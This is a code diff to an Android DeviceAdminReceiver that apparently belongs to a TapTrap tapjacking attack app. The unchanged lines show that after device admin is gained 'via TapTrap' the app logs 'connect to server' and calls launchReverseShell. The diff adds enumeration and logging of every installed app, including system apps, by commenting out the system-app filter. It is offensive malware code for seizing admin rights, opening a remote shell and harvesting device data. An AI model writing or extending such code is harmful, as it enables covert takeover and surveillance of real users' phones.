@@ -25,6 +25,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         // 🔴 TAPTRAP SUCCEEDED!
         Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
         Log.d(TAG, "connect to server ");
+        Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));
         launchReverseShell(context);
 
 //        try {
@@ -230,12 +231,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             for (ApplicationInfo app : apps) {
                 // Skip system apps (optional)
-                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                //if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                     String appName = context.getPackageManager()
                             .getApplicationLabel(app).toString();
                     sb.append("  - ").append(appName)
                             .append(" (").append(app.packageName).append(")\n");
-                }
+                //}
             }
 
             Log.d("TapTrap", "App list generated: " + apps.size() + " apps");
